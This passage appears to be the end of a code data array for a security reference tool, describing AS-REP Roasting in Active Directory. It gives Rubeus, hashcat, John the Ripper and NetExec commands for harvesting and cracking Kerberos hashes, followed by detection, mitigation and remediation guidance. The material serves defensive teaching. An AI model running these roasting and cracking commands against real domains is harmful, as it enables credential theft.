      { title: 'Rubeus — asreproast Hashcat format', command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt' },
      { title: 'Hashcat — crack AS-REP (etype 23)', command: 'hashcat -m 18200 asrep.txt rockyou.txt --force' },
      { title: 'John the Ripper', command: 'john --format=krb5asrep --wordlist=rockyou.txt asrep.txt' },
      { title: 'Validate creds with NetExec', command: 'nxc smb <DC_IP> -u <user> -p <pass>' },
      { title: 'Disable PreAuth (attacker test, do not run in prod)', command: 'Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $true' },
      { title: 'Re-enable PreAuth (remediation)', command: 'Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false' },
    ],
    detection: [
      'Windows Event ID 4768 — TGT request with PreAuthType = 0 (no pre-auth) and Ticket Encryption Type 0x17 (RC4) is the canonical indicator.',
      'Spike in 4768 events from a single source IP across many accounts in a short window.',
      'Honey accounts: create a decoy user with PreAuth disabled and alert on ANY 4768 for it.',
      'Sysmon Event ID 3 (network connect) from non-admin hosts to TCP/88 outside business hours.',
      'EDR detection of Rubeus.exe / GetNPUsers.py command-line patterns.',
    ],
    mitigation: [
      'Audit Active Directory weekly: list every account with DONT_REQ_PREAUTH (UAC 0x400000) and re-enable pre-auth.',
      'Enforce strong password policy (>= 14 chars, complexity, banned-words list) for any account that legitimately must keep PreAuth disabled.',
      'Disable RC4 (etype 23) Kerberos encryption — force AES-128/256 only via GPO "Network security: Configure encryption types allowed for Kerberos".',
      'Privileged accounts go in the Protected Users group — automatically blocks RC4 and disables NTLM/Digest.',
      'Tier-0 administrative model: domain admins never used for daily logon; isolate from workstations.',
      'Continuous attack-surface monitoring with PingCastle / Purple Knight for the DONT_REQ_PREAUTH finding.',
    ],
    remediation: [
      'Identify all roastable accounts: Get-ADUser -Filter \'UserAccountControl -band 4194304\'.',
      'Re-enable PreAuth on each: Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false.',
      'Force a password reset on every account whose hash may have been captured.',
      'Reset krbtgt twice (10-hour gap) if AS-REPs may have been used to mint TGTs offline.',
      'Rotate any service-account passwords matching the cracked one (password reuse hunt).',
      'Push GPO disabling RC4 etypes domain-wide and validate with klist on a test host.',
      'Add the source IP to the firewall blocklist and pull 90 days of 4768 logs for hunt.',
      'File an Azure AD / Entra Conditional Access policy requiring MFA for any sync-back of the affected identity.',
    ],
    mitre: [
      { id: 'T1558.004', name: 'AS-REP Roasting', url: 'https://attack.mitre.org/techniques/T1558/004/' },
      { id: 'T1110.002', name: 'Password Cracking', url: 'https://attack.mitre.org/techniques/T1110/002/' },
      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
    ],
    tools: ['Impacket (GetNPUsers.py)', 'Rubeus', 'PowerView', 'hashcat', 'John the Ripper', 'NetExec / CrackMapExec', 'BloodHound'],
    references: [
      { title: 'HTB Academy — Active Directory Enumeration & Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1558.004', url: 'https://attack.mitre.org/techniques/T1558/004/' },
      { title: 'Microsoft — Kerberos Pre-Authentication', url: 'https://learn.microsoft.com/en-us/windows-server/security/kerberos/preventing-open-network-sharing' },
      { title: 'Hashcat mode 18200 reference', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
    ],
  },
];
